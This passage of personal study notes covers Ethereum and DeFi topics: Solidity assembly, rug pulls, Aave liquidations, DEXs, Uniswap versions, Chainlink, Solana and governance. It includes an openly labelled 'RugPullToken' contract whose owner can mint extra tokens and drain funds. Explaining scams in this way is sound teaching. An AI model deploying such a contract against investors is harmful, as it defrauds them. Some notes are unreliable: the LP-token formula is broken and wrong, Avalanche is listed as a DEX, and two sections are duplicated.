usage.</p></li></ul></li><li><p><strong>Solidity Assembly</strong>:</p><ul><li><p>Every operation has an associated <strong>gas cost</strong> (a computational resource in Ethereum).</p></li><li><p>For example:</p><ul><li><p><code>ADD</code>: 3 gas.</p></li><li><p><code>SSTORE</code>: 20,000 gas (or less with optimizations).</p></li></ul></li></ul></li></ul><hr><h3><strong>7. Use Cases</strong></h3><ul><li><p><strong>Regular Assembly</strong>:</p><ul><li><p>Writing low-level code for performance-critical applications.</p></li><li><p>Operating system kernels, device drivers, embedded systems.</p></li></ul></li><li><p><strong>Solidity Assembly</strong>:</p><ul><li><p>Optimizing smart contracts for gas efficiency.</p></li><li><p>Accessing low-level EVM features not exposed in high-level Solidity.</p></li></ul></li></ul><hr><h3><strong>Conclusion</strong></h3><p>While Solidity assembly is conceptually similar to regular assembly in that both involve low-level programming, Solidity assembly is specialized for the <strong>Ethereum Virtual Machine</strong> and its stack-based, gas-constrained architecture. It is much simpler and more constrained than traditional assembly languages.</p>

<h2>What's L2 are they just smart contracts on ethereum?</h2>
<ul><li><p>L2 is <strong>not just smart contracts</strong> but an <strong>entire system or protocol</strong> that works off-chain or alongside Ethereum.</p></li><li><p>L2 solutions <strong>use smart contracts on Ethereum L1</strong> for specific functions like bridging and validation.</p></li><li><p>If the L2 is EVM-compatible, developers can still use Solidity to write smart contracts for the L2 environment.</p></li></ul>

<h2>What a rug pull contract? Some ERC20 token that has hidden functionalities?</h2>
<p>A <strong>rug pull</strong> is a type of fraudulent activity in the cryptocurrency space, particularly within decentralized finance (DeFi) and token creation. It typically occurs in projects involving token sales or liquidity pools, where the creators of the project intentionally deceive investors or users.</p><p>In the context of a <strong>smart contract</strong> like an ERC-20 token, a rug pull could involve hidden or malicious functionality that is added to the contract. These hidden features can allow the contract creator to:</p><ol><li><p><strong>Withdraw liquidity</strong>: The creator might have the ability to withdraw all the liquidity from a liquidity pool or exchange, leaving investors with worthless tokens.</p></li><li><p><strong>Mint more tokens</strong>: A malicious contract may have an undisclosed function that allows the creator to mint an unlimited number of tokens, diluting the value of the tokens owned by investors.</p></li><li><p><strong>Pause or freeze functionality</strong>: The contract might include functions that let the creator halt trading or movement of tokens, making it impossible for users to sell their tokens once they‚Äôve been purchased.</p></li><li><p><strong>Drain funds</strong>: Sometimes, the contract may have a function that allows the creator to transfer all the funds from the contract‚Äôs balance (such as from token sales or liquidity) to their own wallet.</p></li></ol><p>Rug pulls can be particularly damaging because they exploit the trust users have in smart contracts, which are often assumed to be immutable and transparent. To mitigate the risk of rug pulls, it's important to audit smart contracts and look for suspicious or hidden code.</p><p></p><p>Give me code example</p>

<pre><code>// SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "@openzeppelin/contracts/access/Ownable.sol";
    
    contract RugPullToken is ERC20, Ownable {
    
        // For example, this variable stores the contract's liquidity
        uint256 public liquidity;
    
        // Constructor to initialize the token with a name and symbol
        constructor(uint256 initialSupply) ERC20("RugPullToken", "RUG") {
            _mint(msg.sender, initialSupply * 10 ** decimals());
        }
    
        // Malicious function that allows the owner to mint more tokens
        function mintMoreTokens(uint256 amount) public onlyOwner {
            _mint(msg.sender, amount);
        }
    
        // Function to withdraw all liquidity (funds) from the contract
        function withdrawLiquidity() public onlyOwner {
            payable(owner()).transfer(address(this).balance);
        }
    
        // Function to simulate adding liquidity (just for illustration)
        function addLiquidity() public payable {
            liquidity += msg.value;
        }
    
        // Function to simulate withdrawing the balance of the contract
        function withdrawBalance() public onlyOwner {
            payable(owner()).transfer(address(this).balance);
        }
    
        // Function to demonstrate a rug pull
        function rugPull() public onlyOwner {
            // This function can drain all liquidity and make tokens worthless
            withdrawLiquidity();  // The owner withdraws all liquidity
            mintMoreTokens(1000000 * 10 ** decimals());  // The owner mints extra tokens to dilute value
        }
    }</code></pre><p></p>

<h2>What is AAVE?</h2>
<p><strong>AAVE</strong> is a lending and borrowing platform built on the Ethereum blockchain.</p><p></p><p><strong>KEY POINTS:</strong></p><ul><li><p>open source</p></li><li><p>decentralized</p></li><li><p>non custodial - so no third party is involved holding the assets</p></li><li><p>over collaterized</p></li><li><p>liquidity pool where lenders pool their deposits and borrows borrow money from</p></li><li><p>loan ca be paid back at any time along with the interest</p></li></ul><p></p><p>People who borrow money have to pay interest, and people who lend it receive interest, similar to a bank. However, instead of a bank or loan manager making decisions, it is executed with smart contracts, which are sets of code that automatically execute transactions when certain conditions are met, replacing the middlemen.</p><p></p><p><strong>How collateral works</strong><br>One of the key features of Aave is the requirement for borrowers to deposit collateral in order to borrow another asset. For example, a borrower may need to deposit 10 ETH in order to borrow 8 ETH worth of DAI.</p><p></p><p>The value of the collateral shouldn‚Äôt fall below a certain level w.r.t. the borrowed asset, say 105% of the value of the borrowed asset. This threshold is called the <em>liquidation threshold.</em></p><p>The ratio of collateral value to the liquidation threshold is called the <em>health factor</em>.</p><p>Thus, when the value of collateral falls to the level that‚Äôs below the liquidation threshold, the health factor becomes &lt; 1. This leads to the liquidation of the collateral to repay the borrowed asset.&nbsp;</p><p></p><p>Up to 50% of the borrowed asset is liquidated when health factor becomes &lt; 1. Anyone (including you) can liquidate the asset. The liquidator needs to deposit the borrowed asset and receive the equivalent amount of collateral asset plus a bonus (say 5%) as a liquidation fee. Practically, liquidators usually install bots to beat the competition.</p><p></p><p>To avoid liquidation, you can increase your health factor by depositing more collateral assets or repaying part of your loan. For example, keeping your health factor above 2 can provide a buffer to help you avoid liquidation.</p><p></p><p></p><p>Aave has become one of the biggest lending protocols for cryptocurrencies, along with competitors Compound and MakerDAO. The market leader changes often, but during the time of writing this lesson, Aave holds over $6 billion in value across all chains.</p><p></p><p>Currently, there are three iterations of the protocol: Aave version 1, v2, or v3 ‚Äì each of which brought upgrades to the network.</p><p></p><p>V3 launched in 2022 only supports L2 layer networks such as Arbitrum, Optimism, Polygon, Fanthom. Later on they also added support for Ethereum base layer.</p><p>V2 support Ethereum base layer, Polygon and Avalanche.</p><p></p><p><br>As a decentralised finance (DeFi) platform, Aave includes a range of features, from its native GHO stablecoin to periphery contracts that simplify complex actions like asset swaps and repayments.</p><p>The flexibility of a liquidity protocol like Aave highlights the potential of DeFi to offer more open, transparent, and equitable financial services to anyone with access to a blockchain network.</p><p></p><p><strong>Supply</strong></p><p>In Aave, supplied tokens automatically accrue interest based on the current market supply rate. As the balance of supplied tokens increases, interest is accrued dynamically, reflecting the current rate allocated to suppliers.</p><p>Interest rates for supplied tokens are determined by the borrow utilisation rate, which measures the proportion of assets currently borrowed against the total supplied in the pool, and by governance parameters that can be adjusted through community decisions.</p><p>These parameters, including collateralisation requirements and interest rates for suppliers and borrowers, are influenced by onchain inputs such as token balances, oracle prices, and the borrow utilisation ratio.</p><p>As liquidity is supplied, borrowed, repaid, or withdrawn from the pool, the interest rates are updated accordingly.</p><p></p><p><strong>Repay</strong></p><p>There are <a target="_blank" rel="noopener noreferrer" class="Components__StyledAnchor-sc-452rcd-5 ggRMHZ" href="https://github.com/aave/aave-v3-periphery">periphery contracts</a> available that simplify the process by allowing repayment with other tokens, such as other collateral assets, without the need to manually convert them beforehand. This flexibility makes it easier for borrowers to manage and close their positions when needed.</p><p></p><p><strong>Withdraw</strong></p><p>Aave Protocol allows suppliers to withdraw their supplied tokens, including accrued interest, as long as there is sufficient unborrowed liquidity in the reserve.</p><p></p><p>Periphery contracts with features such as withdraw and switch, allow users to redeem their supplied liquidity in a different token, providing more options for efficient asset management.</p><p></p><p>When withdrawing with an active borrow position, it‚Äôs crucial to maintain a healthy collateralisation ratio to avoid liquidation. Reducing collateral can lower the health factor, increasing the risk of liquidation.</p><p></p><p><strong>Liquidations</strong></p><p>The <strong>health factor</strong> is a critical metric within the Aave Protocol that measures the safety of a borrow position. It is calculated as:</p><pre><code>Health Factor = (Total Collateral Value * Weighted Average Liquidation Threshold) / Total Borrow Value</code></pre><p>For example, if a user supplies $10,000 in ETH with an 80% liquidation threshold and borrows $6,000 in GHO, the health factor would be 1.333.</p><pre><code>HealthFactor = 10000 * 0.8 / 6000 = 1.333</code></pre><p>To improve the health factor, users can either supply more collateral or repay part of the borrow position. The health factor is directly tied to collateral value. If the value rises, the health factor improves; if it falls, the health factor declines, increasing the risk of liquidation.</p><p><br>Liquidation happens when a borrower's health factor drops below 1, meaning their collateral is insufficient to cover the borrowed amount</p><p></p><p>When a liquidation occurs, up to 50% of the borrower's debt is repaid by a liquidator. A liquidation fee is also levied against the borrower's collateral. </p><p></p><p>Liquidations are permissionless, meaning any participant within the network can initiate the liquidation of an eligible borrow position.</p><p><br>Liquidations are highly competitive, requiring a deep understanding of the protocol and technical proficiency. </p><p></p><p>Liquidators closely monitor borrow positions, react swiftly to market changes, and prioritise liquidation transactions to be the first to execute the liquidation.</p>

<h2>Difference between AAVE swaps and a DEX swap?</h2>
<p>AAVE's swaps are <strong>not like the swaps in a DEX</strong> that follow the <strong>constant product formula (x * y = k)</strong> used by automated market makers (AMMs) such as <strong>Uniswap</strong>.</p><p></p><p>In a DEX like Uniswap, the formula <strong>x * y = k</strong> ensures that the product of the quantities of two tokens in a liquidity pool remains constant, providing a decentralized way to determine token prices based on supply and demand.</p><p></p><p>In AAVE, <strong>swaps</strong> are used for purposes such as <strong>collateral management</strong> (e.g., swapping one collateral type for another to avoid liquidation) or <strong>flash loans</strong>, but they do not rely on the constant product formula. Instead, AAVE uses <strong>oracle-based pricing</strong> or the rates provided by liquidity pools for these operations.</p><p></p><p>So, while AAVE does facilitate swaps, it's done within the context of lending and borrowing, not trading like in a DEX.</p>

<h2>Is AAVE a DEX?</h2>
<p>No, <strong>AAVE</strong> is not a decentralized exchange (DEX). <strong>AAVE</strong> is a <strong>decentralized finance (DeFi) protocol</strong> primarily designed for <strong>lending and borrowing</strong> cryptocurrencies. Users can deposit their assets into liquidity pools to earn interest, or they can borrow assets by providing collateral.</p><p></p><p>On the other hand, a <strong>DEX</strong> (Decentralized Exchange), like <strong>Uniswap</strong> or <strong>SushiSwap</strong>, is a platform that facilitates the trading of tokens directly between users, typically through automated market makers (AMMs) or order book systems, without a central intermediary.</p><p></p><p>AAVE includes features that allow for <strong>asset swaps</strong>, but these swaps are <strong>different from the core functionality of a DEX</strong>.</p><p>In AAVE's context, <strong>swaps are part of its lending and borrowing services</strong>, enabling users to:</p><ol><li><p><strong>Repay with collateral:</strong> Borrowers can swap their collateral to repay their loans directly.</p></li><li><p><strong>Flash loans:</strong> Users can borrow funds without collateral, perform actions like arbitrage or liquidation, and then repay the loan in the same transaction. This often involves swapping assets.</p></li></ol>

<h2>What is a DEX?</h2>
<p>A DEX is a peer-to-peer marketplace where users can trade one cryptocurrency for another without any intermediaries or the need to transfer funds to custody.&nbsp;</p><p></p><p>Examples: Uniswap, Trader Joe, Avalanche, Ref Finance.</p><p></p><p>DEX‚Äôs are able to thrive by using an <em>automated market maker (AMM), </em>a set of algorithms that help trade asset pricing.</p><p></p><p>DEXs also preserve their users‚Äô <em>privacy</em> as accounts interacting with a DEX don‚Äôt have to prove their identity, unlike centralised exchanges requiring their users to go through Know Your Customer (KYC) guidelines.</p><p></p><p>On top of its benefits as a privacy-preserving mechanism, DEXs provide an extra layer of <em>security</em> as they also do not control the funds.&nbsp;</p><p></p><p>Aligned with the spirit of web3, a DEX is not run by a community, but rather governed by its community. In the case of Uniswap, for instance, the holders of the $UNI token have voting power in how Uniswap structures itself for its future. Logically, the more $UNI tokens an account has, the more voting power it has.&nbsp;</p><p></p><p>Whenever a pool is created, the balance of that pool for each reserve is equal to zero. This means that the first LP coming to the pool would determine the price of that asset. In fact, the first LP is incentivized to provide liquidity at the correct market rate because otherwise,&nbsp; this creates an <em>arbitrage opportunity</em> for others to come.&nbsp;</p><p></p><p>When an LP decides to provide liquidity for two tokens, Uniswap mints ERC20 tokens for the LP, what they also called liquidity tokens. In Uniswap V2, these tokens represent the LP‚Äôs contribution to the pool. If the LP is providing liquidity for that pool, say <em>x </em>for the first token and <em>y </em>for the second token, then the number of tokens the LP would receive would be equal to the following formula: <code>sqrt(x+y</code></p><p>Providing liquidity is incentivised by the collection of fees that can later be claimed by the LP. If a trade occurs on the liquidity pool that the LP has provided liquidity for, 0.3% of that transaction amount is charged to the transaction sender. This fee is then distributed pro-rata to the LPs.</p>

<h2>Differences between Uniswap versions</h2>
<p>Launched in November 2018, Uniswap V1 is limited to allowing swaps only between the native asset of Ethereum, namely $ETH, and an ERC-20 token. A trader can swap one ERC-20 token with another by using <em>chained swaps</em> that he would swap his ERC-20 token with $ETH and then swap that $ETH with the desired ERC-20 token.</p><p></p><p>Uniswap V2, on the other hand, improved the contracts from a couple of different angles. Importantly, this version allows direct transfers between two ERC-20 tokens and ‚Äúflash swaps‚Äù that allow traders to receive the desired assets and use them elsewhere before paying for them later in the transaction.</p><p></p><p>Uniswap V3 is the latest, improved version of the DEX that comes with some capital efficiency, which allows liquidity providers (LPs) to provide capital at certain intervals that could lead to better returns on their capital. Uniswap V3 uses NFTs as a utility token given to LPs for the intervals in which they provide capital.&nbsp;</p>

<h2>Flash Loan VS Flash Swap</h2>
<p>Flash Loan: Borrows a large sum of cryptocurrency from a lending protocol without any upfront collateral. </p><p></p><p>Flash Swap: Doesn't involve borrowing; it's an atomic swap where you exchange one cryptocurrency for another within a single transaction.</p>

<h2>What is Chainlink?</h2>
<p>Smart contracts have a limitation in that they cannot directly interact with external APIs. This is where oracles like Chainlink come in.</p><p></p><p>Chainlink connects smart contracts with external data using its decentralised oracle network. It consists of multiple nodes that collect particular data from different sources which are then aggregated to a <em>Data Feed</em>.&nbsp;</p><p></p><p>Chainlink VRF, or Verifiable Random Function, is a solution for generating random numbers and events on the blockchain. Chainlink VRF uses cryptographic techniques to generate random numbers that are tamper-proof and tamper-evident, ensuring the fairness and security of the process.</p><p></p><p>In the previous example on data feeds, we explained how to use Chainlink Data Feeds that contain reference data uploaded on the blockchain by oracles. This data is saved in a contract and can be accessed by consumers until the oracle updates it.</p><p></p><p>On the contrary, randomness cannot be considered as reference data. If the output of a randomness generator is saved on the blockchain, any individual could access the value and predict the outcome. Therefore, requesting randomness from an oracle is necessary. The oracle generates a number and creates a cryptographic proof, which is then returned to the contract that initiated the request. This process is known as the Request and Receive cycle.</p>

<h1>Ethereum Roadmap</h1>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://ethroadmap.com/">https://ethroadmap.com/</a></p>

<h2>Use bytes32 instead of bytes</h2>
<p>Bytes means you don‚Äôt know long it will be so you need to either specify memory or calldata so that the compiler can know how to work with the data since it is a complex data structure but bytes32 simply means it won‚Äôt be longer than 32 bytes so for that the compiler know how to work with it without you specifying</p>

<h2>What is Chainlink?</h2>
<p>Smart contracts have a limitation in that they cannot directly interact with external APIs. This is where oracles like Chainlink come in.</p><p></p><p>Chainlink connects smart contracts with external data using its decentralised oracle network. It consists of multiple nodes that collect particular data from different sources which are then aggregated to a <em>Data Feed</em>.&nbsp;</p><p></p><p>Chainlink VRF, or Verifiable Random Function, is a solution for generating random numbers and events on the blockchain. Chainlink VRF uses cryptographic techniques to generate random numbers that are tamper-proof and tamper-evident, ensuring the fairness and security of the process.</p><p></p><p>In the previous example on data feeds, we explained how to use Chainlink Data Feeds that contain reference data uploaded on the blockchain by oracles. This data is saved in a contract and can be accessed by consumers until the oracle updates it.</p><p></p><p>On the contrary, randomness cannot be considered as reference data. If the output of a randomness generator is saved on the blockchain, any individual could access the value and predict the outcome. Therefore, requesting randomness from an oracle is necessary. The oracle generates a number and creates a cryptographic proof, which is then returned to the contract that initiated the request. This process is known as the Request and Receive cycle.</p>

<h2>Use bytes32 instead of bytes</h2>
<p>Bytes means you don‚Äôt know long it will be so you need to either specify memory or calldata so that the compiler can know how to work with the data since it is a complex data structure but bytes32 simply means it won‚Äôt be longer than 32 bytes so for that the compiler know how to work with it without you specifying</p>

<h2>Gas calculator across different chains</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.cryptoneur.xyz/en/gas-fees-calculator?usedGas=93742&amp;txnType=Custom&amp;gasPrice=fast">here</a></p>

<h2>Gwei calculator</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://tatum.io/gwei-calculator">link</a></p>

<h2>What is Solana?</h2>
<p>Solana is a high-performance, decentralized blockchain platform designed to support scalable, user-friendly applications. It's known for its high throughput and low transaction costs. Here are some key features of Solana:</p><ol><li><p><strong>High Performance</strong>: Solana can process thousands of transactions per second (TPS), thanks to its unique consensus mechanism called <strong>Proof of History (PoH)</strong>, which creates a historical record that proves that an event has occurred at a specific moment in time.</p></li><li><p><strong>Low Fees</strong>: Due to its high throughput, Solana maintains low transaction costs, making it attractive for developers and users.</p></li><li><p><strong>Scalability</strong>: Solana's architecture allows it to scale with Moore's Law, meaning it can handle more transactions as hardware improves without the need for complex layer-2 solutions.</p></li><li><p><strong>Ecosystem</strong>: Solana has a growing ecosystem of projects, including DeFi applications, NFTs, Web3 applications, and more.</p></li><li><p><strong>Smart Contracts</strong>: Like Ethereum, Solana supports smart contracts, but it uses a different programming model. Solana smart contracts are written in Rust, C, or C++.</p></li></ol><p>Solana is often seen as a competitor to Ethereum, focusing on speed and scalability while maintaining a decentralized structure.</p>

<h2>How to become a Solana Developer?</h2>
<p>Becoming a Solana developer involves understanding the Solana blockchain's architecture, learning its programming languages, and building decentralized applications (dApps) on it. Here's a step-by-step guide to get started:</p><h3>1. <strong>Understand Blockchain Basics</strong></h3><ul><li><p>Learn the fundamentals of blockchain technology, including how decentralized systems work, consensus mechanisms, and the basics of smart contracts.</p></li></ul><h3>2. <strong>Learn Solana‚Äôs Architecture</strong></h3><ul><li><p>Study Solana's unique features, such as <strong>Proof of History (PoH)</strong>, <strong>Tower BFT</strong>, and its parallel processing approach (Sealevel).</p></li></ul><h3>3. <strong>Set Up Your Development Environment</strong></h3><ul><li><p>Install the necessary tools for Solana development, such as:</p><ul><li><p>Solana CLI (Command Line Interface)</p></li><li><p>Rust (the primary programming language for Solana smart contracts)</p></li><li><p>Node.js (for frontend development and integration)</p></li><li><p>Anchor framework (a popular development framework for Solana)</p></li></ul></li></ul><h3>4. <strong>Learn Rust</strong></h3><ul><li><p>Since Solana smart contracts (also called programs) are written in Rust, learning this language is essential. Focus on the basics and gradually move to advanced concepts specific to Solana.</p></li></ul><h3>5. <strong>Explore the Anchor Framework</strong></h3><ul><li><p>Anchor simplifies smart contract development on Solana, providing a higher-level framework similar to how Truffle works for Ethereum. It handles much of the boilerplate code, making development faster and more accessible.</p></li></ul><h3>6. <strong>Build and Deploy Smart Contracts</strong></h3><ul><li><p>Start with simple smart contracts (e.g., a basic token contract) to understand how to write, deploy, and interact with them on Solana.</p></li><li><p>Use the Solana devnet for testing without incurring costs.</p></li></ul><h3>7. <strong>Develop Frontend for dApps</strong></h3><ul><li><p>Learn how to integrate Solana smart contracts with a frontend using JavaScript, React, and libraries like <code>@solana/web3.js</code>.</p></li></ul><h3>8. <strong>Join the Solana Community</strong></h3><ul><li><p>Engage with the Solana developer community through forums, Discord, and GitHub. Contributing to open-source projects and participating in hackathons can help you learn faster and network with other developers.</p></li></ul><h3>9. <strong>Build Projects</strong></h3><ul><li><p>Create your own dApps to solidify your understanding. Consider projects like DeFi applications, NFTs, or any decentralized services that leverage Solana‚Äôs speed and low fees.</p></li></ul><h3>10. <strong>Stay Updated</strong></h3><ul><li><p>Follow Solana's updates and announcements, as the blockchain space evolves rapidly. Regularly check Solana's documentation, blogs, and community resources.</p></li></ul>

<h2>What is phantom?</h2>
<p>Phantom is a popular, non-custodial cryptocurrency wallet specifically designed for the Solana blockchain. It allows users to store, send, receive, and manage their Solana-based tokens and NFTs. Phantom provides a user-friendly interface and features such as:</p><ul><li><p><strong>Browser Extension and Mobile App</strong>: Available as a browser extension (for Chrome, Firefox, etc.) and as a mobile app for iOS and Android.</p></li><li><p><strong>Secure Key Management</strong>: Users retain control over their private keys, ensuring full ownership of their assets.</p></li><li><p><strong>Integration with dApps</strong>: Seamlessly connects with various decentralized applications (dApps) on the Solana blockchain, enabling activities like trading, DeFi, and NFT marketplaces.</p></li><li><p><strong>Staking</strong>: Users can stake their Solana tokens (SOL) directly from the wallet to earn rewards.</p></li><li><p><strong>Ledger Support</strong>: Phantom supports integration with Ledger hardware wallets for enhanced security.</p></li></ul>

<h2>What is Governance?</h2>
<p>In Solidity, <strong>governance</strong> refers to mechanisms that enable a decentralized community to collectively make decisions about the operation and evolution of a smart contract or decentralized application (DApp). Governance mechanisms are crucial in decentralized organizations like DAOs (Decentralized Autonomous Organizations) and protocols, ensuring that decisions are made transparently and democratically.</p><h3>Key Components of a Governance System in Solidity</h3><ol><li><p><strong>Proposals</strong>: Users submit proposals detailing changes or actions they want to implement.</p></li><li><p><strong>Voting</strong>: Token holders or eligible participants vote on proposals.</p></li><li><p><strong>Quorum and Threshold</strong>: Specific rules determine if a proposal passes, such as a minimum number of votes (quorum) or a specific percentage of approval.</p></li><li><p><strong>Execution</strong>: If a proposal is approved, actions such as updating contract logic or transferring funds are executed.</p></li></ol><hr><h3>Implementation: Proof of Concept (PoC)</h3><p>Here‚Äôs a simplified PoC for a governance system using Solidity.</p><h4>Features:</h4><ul><li><p>Token-based voting.</p></li><li><p>Proposal creation.</p></li><li><p>Voting mechanism.</p></li><li><p>Proposal execution.</p></li></ul><p></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://thequestioners.joesexperiences.com/qaas/811">What can Governance be used for in a DEX</a></p>

<h2>What can a Governance be used for in a DEX?</h2>
<p>And so a proposal could be for a DEX to change the fees, what else can you think of?</p><h6></h6><p>Yes, governance proposals can encompass a wide range of decisions, especially in decentralized ecosystems like decentralized exchanges (DEXs) and DAOs. Here are some examples of proposals relevant to a DEX or other DeFi platforms:</p><hr><h3><strong>1. Fee Management</strong></h3><ul><li><p>Adjusting <strong>trading fees</strong> (e.g., from 0.3% to 0.2%).</p></li><li><p>Changing <strong>withdrawal or deposit fees</strong> for certain tokens.</p></li><li><p>Implementing or modifying <strong>liquidity provider (LP) rewards</strong> fees.</p></li><li><p>Introducing dynamic fees based on market conditions or trading volume.</p></li></ul><hr><h3><strong>2. Liquidity Management</strong></h3><ul><li><p>Adding or removing supported token pairs for trading.</p></li><li><p>Adjusting <strong>incentives for liquidity providers</strong>, such as token rewards or staking APYs.</p></li><li><p>Allocating funds from the treasury to incentivize new liquidity pools.</p></li><li><p>Introducing <strong>concentrated liquidity</strong> (e.g., like Uniswap v3).</p></li></ul><hr><h3><strong>3. Governance Token Utility</strong></h3><ul><li><p>Proposals to modify the utility of governance tokens, such as:</p><ul><li><p>Staking rewards for governance token holders.</p></li><li><p>Token buybacks and burns.</p></li><li><p>Introducing or modifying voting power delegation.</p></li></ul></li></ul><hr><h3><strong>4. Treasury Management</strong></h3><ul><li><p>Allocating funds from the treasury to marketing, partnerships, or grants.</p></li><li><p>Using treasury funds to support community development projects.</p></li><li><p>Setting aside funds for audits or security improvements.</p></li></ul><hr><h3><strong>5. Protocol Upgrades</strong></h3><ul><li><p>Upgrading the smart contracts of the DEX for:</p><ul><li><p>New features (e.g., limit orders, flash loans).</p></li><li><p>Improved gas efficiency.</p></li><li><p>Enhanced security measures.</p></li></ul></li><li><p>Implementing an <strong>upgradable proxy pattern</strong> for future-proofing.</p></li></ul><hr><h3><strong>6. Partnerships and Integrations</strong></h3><ul><li><p>Partnering with other projects or protocols for mutual benefits, such as:</p><ul><li><p>Cross-chain integrations using bridges.</p></li><li><p>Collaborations with yield farming platforms.</p></li><li><p>Partnerships with wallets or analytics tools to improve user experience.</p></li></ul></li></ul><hr><h3><strong>7. Risk Management</strong></h3><ul><li><p>Adjusting <strong>risk parameters</strong> for lending/borrowing pools if integrated with a lending protocol (e.g., collateral factors, liquidation thresholds).</p></li><li><p>Adding or modifying <strong>price oracles</strong>.</p></li><li><p>Blacklisting high-risk tokens or accounts (e.g., due to regulatory issues or exploits).</p></li></ul><hr><h3><strong>8. Community and Ecosystem Development</strong></h3><ul><li><p>Funding hackathons or developer bounties to improve the ecosystem.</p></li><li><p>Introducing educational programs or campaigns for user onboarding.</p></li><li><p>Proposing community initiatives such as user incentives or token airdrops.</p></li></ul><hr><h3><strong>9. DAO Expansion</strong></h3><ul><li><p>Decentralizing governance further by onboarding additional contributors or committees.</p></li><li><p>Establishing sub-DAOs for specialized tasks (e.g., risk management, marketing).</p></li></ul><hr><h3><strong>10. Miscellaneous</strong></h3><ul><li><p>Adding or updating referral programs to incentivize user growth.</p></li><li><p>Proposing environmental impact strategies (e.g., offsetting carbon emissions from proof-of-stake operations).</p></li><li><p>Enabling optional privacy features for users (e.g., zk-SNARKs for transaction anonymity).</p></li><li><p>Transitioning to or adopting multi-chain operations for wider accessibility.</p></li></ul><hr><h3><strong>Real-World Example Proposals</strong></h3><ol><li><p><strong>Uniswap Governance</strong>: Adjusting fee switch parameters for liquidity pools.</p></li><li><p><strong>Compound Governance</strong>: Modifying collateral factors for specific assets.</p></li><li><p><strong>Yearn Governance</strong>: Allocating funds for yield strategies and developer compensation.</p></li></ol><p></p>

<h2>How to move forward time for 7days in solidity test?</h2>
<pre><code class="language-js">uint256 sevenDays = 7 * 24 * 60 * 60; 
vm.warp(block.timestamp + sevenDays);</code></pre>

<h2>Benefits of Using SafeERC20</h2>
<ul><li><p><strong>Safety</strong>: It ensures that transfers are handled safely, even with tokens that do not revert on failure (i.e., tokens that return <code>false</code>).</p></li><li><p><strong>Gas Efficiency</strong>: The <code>SafeERC20</code> functions are optimized for safety and are gas efficient, making your contract more reliable and secure.</p></li><li><p><strong>Simplicity</strong>: It reduces boilerplate code since you no longer need to manually check the return value of each <code>transferFrom</code> call.</p></li></ul>

<h2>Does SafeERC20 make all weird ERC20 problems go away?</h2>
<p><code>SafeERC20</code> improves ERC-20 interactions by ensuring transfers revert on failure, but it doesn't solve all problems.</p><p></p><h3>‚úÖ What SafeERC20 Solves:</h3><ul><li><p><strong>Silent Failures</strong>: Ensures <code>transferFrom</code> and <code>transfer</code> revert if they fail.</p></li><li><p><strong>Standard ERC-20 Handling</strong>: Works with tokens that return <code>false</code> instead of reverting.</p></li><li><p><strong>Non-Standard Tokens</strong>: Wraps functions to enforce predictable behavior.</p></li></ul><p></p><h3>‚ùå What It Doesn't Solve:</h3><ul><li><p><strong>Non-Standard Tokens</strong>: If a token has custom logic, SafeERC20 can‚Äôt fix that.</p></li><li><p><strong>Approval Races</strong>: Doesn't prevent <code>approve</code> race conditions.</p></li><li><p><strong>Complex Token Logic</strong>: Won‚Äôt handle restrictions some tokens impose.</p></li><li><p><strong>Unforeseen Token Bugs</strong>: If the token has a flaw, SafeERC20 can‚Äôt prevent incorrect balances.</p></li></ul><p></p><p><strong>Bottom line:</strong> <code>SafeERC20</code> is a great safeguard, but you still need to review token behavior for edge cases.</p>

<h2>Make slither ignore lib folder</h2>
<pre><code>slither . --filter-paths lib</code></pre>

<h2>Indexing event parameters?</h2>
<p>In Solidity, event parameters are indexed using the <code>indexed</code> keyword. This allows certain parameters to be more efficiently searched in the logs. Only up to three parameters can be indexed in an event.</p><p></p><p>To index parameters in the <code>PoolInitialized</code> event, you would specify the <code>indexed</code> keyword before the parameters you want to index. Here's how you can modify your event to index <code>sender</code> and <code>amount0</code>:</p><pre><code>event PoolInitialized(address indexed sender, uint256 indexed amount0, uint256 amount1);</code></pre><p></p><ul><li><p><code>address indexed sender</code>: This allows you to filter logs based on the <code>sender</code> address.</p></li><li><p><code>uint256 indexed amount0</code>: This allows you to filter logs based on the <code>amount0</code>.</p></li><li><p><code>uint256 amount1</code>: This parameter is not indexed, meaning you cannot filter logs based on it, but it will still be part of the log data.</p></li></ul><p></p><p>Indexed parameters allow you to more efficiently search for specific values when querying events, such as using filters in a web3-based application.</p><p></p><p>You can index <strong>up to three parameters</strong> in a Solidity event. If an event has more than three parameters, the remaining ones must be non-indexed. So you should always index up to 3 parameters for efficiency.</p><p></p><h3>Why the Limit?</h3><ul><li><p>Indexed parameters are stored in <strong>topics</strong> in the Ethereum logs, which are optimized for filtering.</p></li><li><p>Ethereum log entries can have a maximum of <strong>four topics</strong>:</p><ol><li><p>The first topic is always the <strong>event signature (hash of the event name and parameter types)</strong>.</p></li><li><p>The remaining three topics can be used for indexed parameters.</p></li></ol></li></ul><p></p><p>Non-indexed parameters are stored in the <strong>data field</strong> of the log, making them accessible but not filterable when querying logs.</p>

<h2>Whats the industry standard on calling approve?</h2>
<p>The industry standard approach depends on the context and the user experience you're aiming for. Here's how it's typically handled:</p><h3>1. <strong>Explicit </strong><code>approve</code><strong> Calls (Common in DeFi)</strong></h3><ul><li><p><strong>Standard:</strong> In decentralized finance (DeFi) applications, it's common for users to explicitly call <code>approve</code> before interacting with smart contracts that require token transfers. This method is standard due to its simplicity and compatibility with any ERC20 token.</p></li><li><p><strong>Pros:</strong> Simple and straightforward, well-understood by the community.</p></li><li><p><strong>Cons:</strong> Requires two transactions, increasing gas costs and user friction.</p><p></p></li></ul><h3>2. <strong>Use of </strong><code>permit</code><strong> (EIP-2612)</strong></h3><ul><li><p><strong>Standard:</strong> Increasingly popular, especially in user-friendly DeFi applications, <code>permit</code> allows for gasless approvals using off-chain signatures. Projects like Uniswap V3 and Aave use this approach.</p></li><li><p><strong>Pros:</strong> Reduces the need for explicit <code>approve</code> calls, lowers transaction fees, improves user experience.</p></li><li><p><strong>Cons:</strong> Requires ERC20 tokens to implement the <code>permit</code> function, not all tokens support it.</p></li></ul><p></p><h3>3. <strong>Integrated Approval Mechanisms</strong></h3><ul><li><p><strong>Standard:</strong> Some platforms integrate the approval logic into the user interaction flow, either by requesting a large allowance once or by bundling approval with other actions.</p></li><li><p><strong>Pros:</strong> Streamlines the process, reducing the need for multiple 